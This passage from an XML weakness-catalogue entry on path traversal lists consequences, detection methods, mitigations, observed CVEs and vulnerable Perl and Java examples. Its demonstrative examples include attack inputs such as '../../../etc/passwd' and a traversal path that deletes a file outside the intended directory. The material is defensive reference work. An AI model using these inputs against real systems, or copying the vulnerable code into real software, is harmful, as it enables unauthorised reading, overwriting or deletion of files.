            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Files or Directories</Impact>
               <Note>The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Note>The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated techniques can find areas where path traversal weaknesses exist. However, tuning or customization may be required to remove or de-prioritize path-traversal problems that are only exploitable by the software's administrator - or other privileged users - and thus potentially valid behavior or, at worst, a bug instead of a vulnerability.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis</Method>
               <Description>Manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all file access operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.</xhtml:p>
                  <xhtml:p>Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links (CWE-23, CWE-59). This includes:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:ul>
                        <xhtml:li>realpath() in C</xhtml:li>
                        <xhtml:li>getCanonicalPath() in Java</xhtml:li>
                        <xhtml:li>GetFullPath() in ASP.NET</xhtml:li>
                        <xhtml:li>realpath() or abs_path() in Perl</xhtml:li>
                        <xhtml:li>realpath() in PHP</xhtml:li>
                     </xhtml:ul>
                  </xhtml:div>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-34">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</xhtml:p>
                  <xhtml:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.</xhtml:p>
                  <xhtml:p>If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.</xhtml:p>
                  <xhtml:p>In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-27">
               <Intro_Text>The following code could be for a social networking application in which each user's profile information is stored in a separate file. All files are stored in a single directory.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $dataPath = "/users/cwe/profiles";<xhtml:br/>my $username = param("user");<xhtml:br/>my $profilePath = $dataPath . "/" . $username;<xhtml:br/>
                     <xhtml:br/>open(my $fh, "&lt;$profilePath") || ExitError("profile read error: $profilePath");<xhtml:br/>print "&lt;ul&gt;\n";<xhtml:br/>while (&lt;$fh&gt;) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>print "&lt;li&gt;$_&lt;/li&gt;\n";</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}<xhtml:br/>print "&lt;/ul&gt;\n";</xhtml:div>
               </Example_Code>
               <Body_Text>While the programmer intends to access files such as "/users/cwe/profiles/alice" or "/users/cwe/profiles/bob", there is no verification of the incoming user parameter. An attacker could provide a string such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>The program would generate a profile pathname like this:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/users/cwe/profiles/../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>When the file is opened, the operating system resolves the "../" during path canonicalization and actually accesses this file:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>As a result, the attacker could read the entire text of the password file.</Body_Text>
               <Body_Text>Notice how this code also contains an error message information leak (CWE-209) if the user parameter does not produce a file that exists: the full pathname is provided. Because of the lack of output encoding of the file that is retrieved, there might also be a cross-site scripting problem (CWE-79) if profile contains any HTML, but other code would need to be examined.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-18">
               <Intro_Text>In the example below, the path to a dictionary file is read from a system property and used to initialize a File object.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String filename = System.getProperty("com.domain.application.dictionaryFile");<xhtml:br/>File dictionaryFile = new File(filename);</xhtml:div>
               </Example_Code>
               <Body_Text>However, the path is not validated or modified to prevent it from containing relative or absolute path sequences before creating the File object. This allows anyone who can control the system property to determine what file is used. Ideally, the path should be resolved relative to some kind of application or user home directory.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-2">
               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter "../" from the input. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the regular expression does not have the /g global match modifier, it only removes the first instance of "../" it comes across. So an input value such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" stripped, resulting in:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-23).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code attempts to validate a given input path by checking it against a whitelist and once validated delete the given file. In this specific case, the path is considered valid if it starts with the string "/safe_dir/".</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String path = getInputPath();<xhtml:br/>if (path.startsWith("/safe_dir/"))<xhtml:br/>{<xhtml:div style="margin-left:10px;">
                        <xhtml:div>File f = new File(path);<xhtml:br/>f.delete()</xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>An attacker could provide an input such as this:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>/safe_dir/../important.dat</xhtml:div>
               </Example_Code>
               <Body_Text>The software assumes that the path is valid because it starts with the "/safe_path/" sequence, but the "../" sequence will cause the program to delete the important.dat file in the parent directory</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-22">
               <Intro_Text>The following code demonstrates the unrestricted upload of a file with a Java servlet and a path traversal vulnerability. The HTML code is the same as in the previous example with the action attribute of the form sending the upload file request to the Java servlet instead of the PHP code.</Intro_Text>
               <Example_Code Nature="good" Language="HTML">
                  <xhtml:div>&lt;form action="FileUploadServlet" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                     <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
                     <xhtml:br/>&lt;/form&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>When submitted the Java servlet's doPost method will receive the request, extract the name of the file from the Http request header, read the file contents from the request and output the file to the local upload directory.</Body_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>public class FileUploadServlet extends HttpServlet {<xhtml:br/>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:div>...<xhtml:br/>
                           <xhtml:br/>protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {<xhtml:br/>
                           <xhtml:div style="margin-left:10px;">
                              <xhtml:div>response.setContentType("text/html");<xhtml:br/>PrintWriter out = response.getWriter();<xhtml:br/>String contentType = request.getContentType();<xhtml:br/>
                                 <xhtml:div>
                                    <xhtml:i>// the starting position of the boundary header</xhtml:i>
                                 </xhtml:div>
                                 <xhtml:br/>int ind = contentType.indexOf("boundary=");<xhtml:br/>String boundary = contentType.substring(ind+9);<xhtml:br/>
                                 <xhtml:br/>String pLine = new String();<xhtml:br/>String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value<xhtml:br/>
                                 <xhtml:div>
                                    <xhtml:i>// verify that content type is multipart form data</xhtml:i>
                                 </xhtml:div>
                                 <xhtml:br/>if (contentType != null &amp;&amp; contentType.indexOf("multipart/form-data") != -1) {<xhtml:br/>
                                 <xhtml:div style="margin-left:10px;">
                                    <xhtml:div>// extract the filename from the Http header<xhtml:br/>BufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));<xhtml:br/>...<xhtml:br/>pLine = br.readLine();<xhtml:br/>String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));<xhtml:br/>...<xhtml:br/>
                                       <xhtml:div>
                                          <xhtml:i>// output the file to the local upload directory</xhtml:i>
                                       </xhtml:div>
                                       <xhtml:br/>try {<xhtml:div style="margin-left:10px;">
                                          <xhtml:div>BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));<xhtml:br/>for (String line; (line=br.readLine())!=null; ) {<xhtml:div style="margin-left:10px;">
                                                <xhtml:div>if (line.indexOf(boundary) == -1) {<xhtml:div style="margin-left:10px;">
                                                      <xhtml:div>bw.write(line);<xhtml:br/>bw.newLine();<xhtml:br/>bw.flush();</xhtml:div>
                                                   </xhtml:div>
                                                   <xhtml:br/>}</xhtml:div>
                                             </xhtml:div>
                                             <xhtml:br/>} //end of for loop<xhtml:br/>bw.close();</xhtml:div>
                                       </xhtml:div>
                                       <xhtml:br/>
                                       <xhtml:br/>} catch (IOException ex) {...}<xhtml:div>
                                          <xhtml:i>// output successful upload response HTML page</xhtml:i>
                                       </xhtml:div>
                                    </xhtml:div>
                                 </xhtml:div>
                                 <xhtml:br/>}<xhtml:div>
                                    <xhtml:i>// output unsuccessful upload response HTML page</xhtml:i>
                                 </xhtml:div>
                                 <xhtml:br/>else<xhtml:br/>{...}</xhtml:div>
                           </xhtml:div>
                           <xhtml:br/>}<xhtml:div style="margin-left:10px;">
                              <xhtml:div>...</xhtml:div>
                           </xhtml:div>
                        </xhtml:div>
                     </xhtml:div>
                     <xhtml:br/>}</xhtml:div>
               </Example_Code>
               <Body_Text>This code does not check the filename that is provided in the header, so an attacker can use "../" sequences to write to files outside of the intended directory. Depending on the executing environment, the attacker may be able to specify arbitrary files to write to, leading to a wide variety of consequences, from code execution, XSS (CWE-79), or system crash.</Body_Text>
               <Body_Text>Also, this code does not perform a check on the type of the file being uploaded. This could allow an attacker to upload any executable file or other file with malicious code (CWE-434).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2010-0467</Reference>
               <Description>Newsletter module allows reading arbitrary files using "../" sequences.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0467</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4194</Reference>
               <Description>FTP server allows deletion of arbitrary files using ".." in the DELE command.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4194</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4053</Reference>
               <Description>FTP server allows creation of arbitrary directories using ".." in the MKD command.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4053</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0244</Reference>
               <Description>OBEX FTP service for a Bluetooth device allows listing of directories, and creation or reading of files using ".." sequences.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0244</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4013</Reference>
               <Description>Software package maintenance program allows overwriting arbitrary files using "../" sequences.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4013</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4449</Reference>
               <Description>Bulletin board allows attackers to determine the existence of files using the avatar.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4449</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-4581</Reference>
               <Description>PHP program allows arbitrary code execution using ".." in filenames that are fed to the include() function.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4581</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0012</Reference>
               <Description>Overwrite of files using a .. in a Torrent file.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0012</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-0013</Reference>
               <Description>Chat program allows overwriting files using a custom smiley request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0013</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5748</Reference>
               <Description>Chain: external control of values for user's desired language and theme enables path traversal.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5748</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1936</Reference>
               <Description>Chain: library file sends a redirect if it is directly requested but continues to execute, allowing remote file inclusion and path traversal.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1936</Link>
            </Observed_Example>
         </Observed_Examples>
         <Functional_Areas>
            <Functional_Area>File Processing</Functional_Area>
         </Functional_Areas>
         <Affected_Resources>
            <Affected_Resource>File or Directory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2007">
               <Entry_ID>A4</Entry_ID>
               <Entry_Name>Insecure Direct Object Reference</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A2</Entry_ID>
               <Entry_Name>Broken Access Control</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO02-C</Entry_ID>
               <Entry_Name>Canonicalize path names originating from untrusted sources</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT Perl Secure Coding">
               <Entry_ID>IDS00-PL</Entry_ID>
               <Entry_Name>Canonicalize path names before validating them</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>33</Entry_ID>
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP16</Entry_ID>
               <Entry_Name>Path Traversal</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="126"/>
            <Related_Attack_Pattern CAPEC_ID="213"/>
            <Related_Attack_Pattern CAPEC_ID="23"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 11, &#34;Directory Traversal and Using Parent Paths (..)&#34;&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;Page 370"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-185"/>
            <Reference External_Reference_ID="REF-186"/>
            <Reference External_Reference_ID="REF-76"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Filenames and Paths&#34;, Page&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;503."/>
         </References>
         <Notes>
            <Note Type="Relationship">Pathname equivalence can be regarded as a type of canonicalization error.</Note>
            <Note Type="Relationship">Some pathname equivalence issues are not directly related to directory traversal, rather are used to bypass security-relevant checks for whether a file/directory can be accessed by the attacker (e.g. a trailing "/" on a filename could bypass access rules that don't expect a trailing /, causing a server to provide the file when it normally would not).</Note>
            <Note Type="Terminology">
               <xhtml:p>Like other weaknesses, terminology is often based on the types of manipulations used, instead of the underlying weaknesses. Some people use "directory traversal" only to refer to the injection of ".." and equivalent sequences whose specific meaning is to traverse directories.</xhtml:p>
               <xhtml:p>Other variants like "absolute pathname" and "drive letter" have the *effect* of directory traversal, but some people may not call it such, since it doesn't involve ".." or equivalent.</xhtml:p>
            </Note>
            <Note Type="Research Gap">Many variants of path traversal attacks are probably under-studied with respect to root cause. CWE-790 and CWE-182 begin to cover part of this gap.</Note>
            <Note Type="Research Gap">
               <xhtml:p>Incomplete diagnosis or reporting of vulnerabilities can make it difficult to know which variant is affected. For example, a researcher might say that "..\" is vulnerable, but not test "../" which may also be vulnerable.</xhtml:p>
               <xhtml:p>Any combination of directory separators ("/", "\", etc.) and numbers of "." (e.g. "....") can produce unique variants; for example, the "//../" variant is not listed (CVE-2004-0325). See this entry's children and lower-level descendants.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
